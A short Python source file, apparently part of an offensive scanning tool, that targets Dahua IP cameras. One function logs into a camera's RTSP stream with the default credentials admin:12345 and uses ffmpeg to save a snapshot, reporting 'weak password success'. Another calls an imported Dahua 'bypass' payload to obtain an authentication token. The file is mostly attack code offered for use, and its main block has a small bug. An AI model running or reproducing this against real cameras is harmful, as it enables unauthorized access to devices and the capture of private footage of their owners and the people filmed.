# encoding=utf8
# 大华 rtsp 弱密码
# 主码流
# rtsp://admin:12345@IP:554/cam/realmonitor?channel=1&subtype=0
from utils.runshell import run_cmd
from utils.log import logger
from dahua.bypass import Payload
from pathlib import Path
import httpx


def get_rtsp(ip: str, save_path: Path) -> bool:
    """根据rtsp地址获取摄像头快照"""
    cmd = f'ffmpeg -i "rtsp://admin:12345@{ip}:554/cam/realmonitor?channel=1&subtype=0" -y -f mjpeg -t 0.001 -s 1280x720 {save_path.joinpath(ip+".jpg")}'
    res = run_cmd(cmd)
    # res = os.system(cmd)
    # if res and ("401" not in res[1]) and ("404" not in res[1]):
    if res:
        # if res == 0:
        logger.success(f"[+] IP:{ip},大华rstp弱密码成功!")
        return True

    logger.info(f"[-] IP:{ip},大华rstp弱密码失败...")
    return False


def get_cve(ip: str) -> bool:
    try:
        dh = Payload(ip).get_token()
        return dh
    except httpx.HTTPError:
        logger.info(f"[-] IP:{ip},大华请求漏洞失败!")
        return False
    except Exception as e:
        logger.info(f"[-] IP:{ip},大华请求其他错误!{e}")
        return False


if __name__ == "__main__":
    get_rtsp("12")
